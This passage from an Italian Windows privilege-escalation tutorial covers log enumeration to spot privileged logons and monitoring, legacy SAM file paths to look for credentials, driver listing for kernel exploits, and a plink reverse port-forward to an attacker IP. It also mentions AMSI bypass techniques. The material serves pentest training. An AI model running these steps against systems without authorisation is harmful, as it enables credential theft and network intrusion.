I log di Windows possono rivelare informazioni utili sia per la privilege escalation sia per capire cosa è già stato osservato dal blue team sulla macchina:

```powershell
# Verifica presenza di soluzioni di monitoring/EDR (es. Splunk) dai log applicativi
Get-EventLog -LogName "Application" | Where-Object {$_.Message -like '*splunkd*'} | Select-Object TimeCreated, Message | Format-Table -Wrap

# Logon riusciti (4624) — utile per capire quali account si sono autenticati su questa macchina
Get-EventLog -LogName "Security" -InstanceId 4624 | Select-Object TimeCreated, @{N='User';E={$_.ReplacementStrings[5]}}, @{N='LogonType';E={$_.ReplacementStrings[8]}} | Format-Table

# Logon falliti (4625)
Get-EventLog -LogName "Security" -InstanceId 4625 | Select-Object TimeCreated, Message | Format-Table -Wrap

# PowerShell Script Block Logging (4104) — se abilitato, mostra il contenuto reale degli script eseguiti, incluse eventuali credenziali hardcoded
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" | Where-Object {$_.Id -eq 4104} | Select-Object TimeCreated, Message | Format-Table -Wrap

# Installazione servizi (7045) — utile anche in fase difensiva per individuare PE già avvenute
Get-EventLog -LogName "System" | Where-Object {$_.EventID -eq 7045} | Select-Object TimeCreated, Message | Format-Table -Wrap
```

I logon di tipo 4624 correlati a un `LogonType` interattivo o RDP possono indicare quali account privilegiati si autenticano periodicamente sulla macchina — un dato utile per pianificare il polling loop descritto in precedenza e intercettare quell'account nel momento in cui è attivo.

Per portare i log fuori dalla macchina per analisi offline:

```powershell
Get-EventLog -LogName "Security" -Newest 1000 | Export-Csv C:\temp\sec_log.csv -NoTypeInformation
```

### Copie Offline del SAM

Oltre al backup esplicito con `reg save` già descritto in [Credential Dumping](https://hackita.it/articoli/credential-dumping/), su alcune build possono restare copie residue del SAM in percorsi legacy, utili se accessibili in lettura:

```
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\RegBack\system
```

Su build moderne queste copie sono spesso vuote o non presenti per motivi di hardening, ma vale la pena verificarle prima di ricorrere a `reg save` esplicito, che è più rumoroso.

### Driver di Terze Parti

```cmd
driverquery /v /fo csv
```

```powershell
Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer
```

Driver di terze parti non aggiornati sono un vettore comune per kernel exploit (vedi la sezione dedicata più sopra) — utile incrociare questo output con il catalogo CVE prima di scartare l'ipotesi kernel.

### Pivoting verso Servizi Esposti Solo Localmente

Quando `netstat -ano` rivela un servizio in ascolto solo su `127.0.0.1` (quindi non raggiungibile dall'esterno), un semplice port forward tramite un binario già presente sulla macchina permette comunque di raggiungerlo dall'attaccante:

```cmd
netstat -ano
```

```cmd
:: plink — port forward verso l'attaccante per un servizio locale-only
plink.exe -R <porta_remota_su_attaccante>:127.0.0.1:<porta_locale_servizio> root@<IP_ATTACCANTE>
```

Vedi anche l'approccio più moderno con [Chisel](https://hackita.it/articoli/chisel/) o [proxychains](https://hackita.it/articoli/proxychains/) per lo stesso obiettivo.

### Nota su AMSI Bypass

Alcuni script di enumerazione o PoC circolanti online includono tecniche di bypass di AMSI (Antimalware Scan Interface) per eseguire codice PowerShell che altrimenti verrebbe bloccato prima ancora di girare. Queste tecniche — in particolare le più datate basate sulla patch in memoria del campo `amsiInitFailed` — sono ampiamente conosciute e firmate dalla maggior parte degli EDR moderni: vanno considerate più che altro materiale didattico per capire il meccanismo di AMSI, non un metodo affidabile di evasione in un ambiente con detection aggiornata. In un engagement reale, verificare sempre se la tecnica specifica è ancora efficace contro l'EDR del target prima di farci affidamento.

***

## Conclusione

La maggior parte delle PE trovate nei pentest reali non richiede exploit kernel — bastano misconfigurazioni nei servizi, permessi errati o credenziali memorizzate. Il flusso corretto resta: enumerazione automatica (WinPEAS/PrivescCheck/PowerUp) → analisi manuale dei risultati → exploit del vettore più affidabile per il contesto specifico, riservando i kernel exploit come ultima risorsa per il rischio di instabilità che comportano.

***

**Risorse:**

* [MITRE ATT\&CK – T1068](https://attack.mitre.org/techniques/T1068/)
* [MITRE ATT\&CK – T1134](https://attack.mitre.org/techniques/T1134/)
